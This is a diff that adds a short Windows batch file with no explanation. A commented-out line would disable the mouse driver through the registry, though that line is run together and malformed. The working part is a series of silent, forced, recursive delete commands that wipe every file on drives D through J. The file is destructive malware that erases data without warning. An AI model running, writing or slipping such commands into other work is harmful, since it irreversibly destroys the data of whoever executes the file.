@@ -1,0 +1,12 @@
+rem ———————————
+rem Disable Mouse set key =”HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass”reg delete %key%reg add %key% /v Start /t REG_DWORD /d4
+rem ———————————
+
+@echo off
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
